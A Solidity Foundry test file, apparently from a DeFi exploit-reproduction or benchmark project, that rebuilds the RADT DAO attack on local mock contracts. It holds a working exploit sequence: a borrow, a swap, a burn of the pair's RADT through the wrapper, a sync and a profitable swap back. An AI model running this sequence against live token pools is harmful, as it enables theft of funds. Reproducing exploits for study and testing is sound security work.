// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {RADTDAO} from "./RADTDAO.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {Wrapper} from "./Wrapper.sol";

contract RADTDAOTestBase is Test, BlockLoader {
    RADTDAO radt;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    Wrapper wrapper;
    AttackContract attackContract;
    address owner;
    address attacker;
    address radtAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address wrapperAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1663905800;
    uint112 reserve0pair = 94453473060895791601540;
    uint112 reserve1pair = 8163658010724952139310;
    uint32 blockTimestampLastpair = 1663905794;
    uint256 kLastpair = 771084437533614376388993871504910532570047377;
    uint256 price0CumulativeLastpair = 1221402894907148026766298229634119016688;
    uint256 price1CumulativeLastpair =
        171626870517834744593910101969779780246953;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 94453473060895791601540;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtwrapper = 0;
    uint256 totalSupplyradt = 999999000000000000000000;
    uint256 balanceOfradtpair = 8163658010724952139310;
    uint256 balanceOfradtattacker = 0;
    uint256 balanceOfradtwrapper = 0;

    function setUp() public {
        owner = address(this);
        radt = new RADTDAO();
        radtAddr = address(radt);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(radt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        wrapper = new Wrapper(address(radt));
        wrapperAddr = address(wrapper);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        radt.transfer(address(pair), balanceOfradtpair);
        radt.afterDeploy(address(pair), address(wrapper));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Radt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(radt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(radt),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(usdt),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(pair),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Wrapper Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(wrapper),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(wrapper),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(attacker),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_radt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        radt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_radt_owner(uint256 amount) internal eurus {
        radt.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_radt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        radt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_radt_pair(uint256 amount) internal eurus {
        radt.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdt_radt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_radt_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        radt.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_radt_pair(uint256 amount) internal eurus {
        wrapper.withdraw(address(owner), address(pair), amount);
        pair.sync();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 1000e18);
        borrow_usdt_owner(1000e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", usdt.balanceOf(attacker));
        emit log_named_uint(
            "amt2",
            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
        );
        swap_pair_attacker_usdt_radt(
            usdt.balanceOf(attacker),
            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", (radt.balanceOf(address(pair)) * 100) / 9);
        burn_radt_pair((radt.balanceOf(address(pair)) * 100) / 9);
        printBalance("After step2 ");
        emit log_named_uint("amt4", radt.balanceOf(attacker));
        emit log_named_uint(
            "amt5",
            pair.getAmountOut(radt.balanceOf(attacker), address(radt))
        );
        swap_pair_attacker_radt_usdt(
            radt.balanceOf(attacker),
            pair.getAmountOut(radt.balanceOf(attacker), address(radt))
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", (1000e18 * 1003) / 1000);
        payback_usdt_owner((1000e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        burn_radt_pair(amt3);
        swap_pair_attacker_radt_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
